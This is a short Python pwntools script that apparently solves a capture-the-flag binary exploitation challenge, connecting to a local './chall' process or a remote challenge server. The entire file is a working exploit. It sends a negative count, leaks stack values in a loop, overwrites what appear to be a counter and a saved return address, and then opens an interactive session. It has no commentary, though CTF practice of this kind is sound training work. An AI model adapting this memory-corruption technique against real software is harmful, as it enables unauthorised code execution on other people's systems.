#!/usr/bin/env python3

from pwn import *

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 11114)
    else:
        p = process('./chall')
        gdb.attach(p, '''
            b *(vuln+459)
            continue
        ''')
    return p

p = conn()

p.sendlineafter(b':', b'-1')
for i in range(33):
    p.sendlineafter(b':', b'n')
    p.recvuntil(b'You entered')
    v = p.recvuntil(b'.')
    v = int(v[:-1])
    print('{} {:08x}'.format(i, v))
    if i == 7:
        v = 33
    elif i == 8:
        v = 0
    elif i == 29:
        low = v
        v += 6
    elif i == 30:
        high = v
    elif i == 31:
        v = low - 0x299
    elif i == 32:
        v = high  
    p.sendlineafter(b':', str(v).encode('ascii'))
    p.sendlineafter(b'?:', b'y')

p.interactive()
